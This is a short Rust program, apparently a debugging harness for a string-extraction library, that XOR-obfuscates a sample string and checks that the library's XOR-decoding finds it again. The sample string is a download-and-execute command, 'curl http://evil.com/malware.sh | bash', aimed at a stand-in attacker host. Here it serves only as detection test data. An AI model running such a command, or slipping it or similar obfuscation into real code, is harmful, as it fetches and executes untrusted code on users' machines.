use stng::{extract_strings_with_options, ExtractOptions, StringMethod, StringKind};

fn main() {
    // Create the exact same data as the test
    let plaintext = b"Mozilla/5.0 curl http://evil.com/malware.sh | bash";
    let hex_encoded = hex::encode(plaintext);
    println!("Hex encoded: {}", hex_encoded);
    println!("Hex length: {}", hex_encoded.len());

    // XOR with 0x42
    let xored: Vec<u8> = hex_encoded.bytes().map(|b| b ^ 0x42).collect();
    println!("XOR'd length: {}", xored.len());
    println!("XOR'd (as string): {}", String::from_utf8_lossy(&xored));

    // Create binary with 0x42 fill
    let mut data = vec![0x42u8; 1024];
    data[512..512 + xored.len()].copy_from_slice(&xored);
    println!("Data length: {}", data.len());

    // Extract with XOR key
    let opts = ExtractOptions::new(4)
        .with_xor_key(vec![0x42])
        .with_garbage_filter(true);
    let strings = extract_strings_with_options(&data, &opts);

    println!("\nFound {} strings total", strings.len());
    for (i, s) in strings.iter().enumerate() {
        println!("{}: {:?} {:?} @ {} len={}: {}",
            i, s.method, s.kind, s.data_offset, s.value.len(),
            &s.value[..s.value.len().min(60)]);
    }

    // Check for XOR strings
    let xor_count = strings.iter().filter(|s| s.method == StringMethod::XorDecode).count();
    println!("\nXOR-decoded strings: {}", xor_count);
}
